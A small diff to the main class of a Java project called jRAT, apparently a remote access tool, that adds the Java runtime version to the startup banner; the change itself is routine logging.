@@ -40,7 +40,7 @@ public class Main {
 	public static Frame instance;
 
 	public static void main(String[] args) throws Exception {	
-		System.out.println("jRAT " + Version.getVersion() + " " + DateFormat.getDateInstance(DateFormat.SHORT).format(new Date()));
+		System.out.println("jRAT " + Version.getVersion() + " " + DateFormat.getDateInstance(DateFormat.SHORT).format(new Date()) + " " + System.getProperty("java.version"));
 		
 		debug = argsContains(args, "--debug");
 
